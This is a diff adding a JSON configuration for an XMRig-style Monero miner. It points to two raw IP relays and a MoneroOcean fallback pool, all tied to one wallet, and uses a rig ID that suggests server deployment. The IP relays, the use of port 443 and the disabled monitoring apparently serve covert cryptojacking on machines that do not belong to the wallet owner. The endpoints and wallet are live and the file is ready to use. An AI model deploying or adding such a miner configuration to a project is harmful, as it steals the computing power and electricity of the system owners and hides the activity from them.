@@ -1,0 +1,59 @@
+{
+  "api": {
+    "id": null
+  },
+  "http": {
+    "enabled": false
+  },
+  "autosave": false,
+  "cpu": {
+    "enabled": true,
+    "huge-pages": true,
+    "memory-pool": false,
+    "priority": null,
+    "yield": true,
+    "max-threads-hint": 100
+  },
+  "randomx": {
+    "init": -1,
+    "mode": "auto",
+    "rdmsr": true,
+    "wrmsr": true,
+    "numa": false,
+    "1gb-pages": false
+  },
+  "pools": [
+    {
+      "url": "130.94.112.197:10002",
+      "user": "874yo479WPRgjWLXNyTvxmjdz3iwgMP4dD85h4hGPaB1jNAgjQx3zSzXfeZJq1uykg3x2c3HSfXYBcVYzz8fFfhPT7j7y2i",
+      "pass": "533a0ff6f84f5a41ddf77c739b8226363918b942",
+      "keepalive": true,
+      "enabled": false,
+      "tls": false,
+      "rig-id": "V_serversr_d8d5"
+    },
+    {
+      "url": "185.146.232.55:443",
+      "user": "874yo479WPRgjWLXNyTvxmjdz3iwgMP4dD85h4hGPaB1jNAgjQx3zSzXfeZJq1uykg3x2c3HSfXYBcVYzz8fFfhPT7j7y2i",
+      "pass": "533a0ff6f84f5a41ddf77c739b8226363918b942",
+      "keepalive": true,
+      "enabled": true,
+      "tls": true,
+      "rig-id": "V_serversr_d8d5",
+      "tls-fingerprint": "D2CC627EFFA8B10BE77541862C66DD9FF84B5FFC8858E3A0CB836B617A90151C"
+    },
+    {
+      "url": "gulf.moneroocean.stream:10001",
+      "user": "874yo479WPRgjWLXNyTvxmjdz3iwgMP4dD85h4hGPaB1jNAgjQx3zSzXfeZJq1uykg3x2c3HSfXYBcVYzz8fFfhPT7j7y2i",
+      "pass": "x",
+      "rig-id": "P_DIRECT_FALLBACK",
+      "keepalive": true,
+      "enabled": true,
+      "tls": false
+    }
+  ],
+  "retries": 30,
+  "retry-pause": 5,
+  "donate-level": 1
+}
+
